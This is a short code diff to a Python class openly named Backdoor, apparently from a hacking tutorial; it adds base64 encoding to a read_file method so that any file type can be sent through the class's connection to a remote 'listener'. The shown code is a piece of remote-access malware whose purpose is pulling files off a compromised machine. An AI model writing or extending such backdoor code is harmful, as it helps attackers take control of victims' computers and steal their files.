@@ -2,6 +2,7 @@ import socket
 import subprocess
 import json
 import os
+import base64
 
 
 class Backdoor:
@@ -31,7 +32,9 @@ class Backdoor:
     # Read file as binary
     def read_file(self, path):
         with open(path, "rb") as file:  # "rb" stands for read binary
-            return file.read()
+            # Encode the data in base64 to manage all file's types
+            # by encapsulating all special characters
+            return base64.b64encode(file.read())
 
     # Start the connection to the listener
     def run(self):
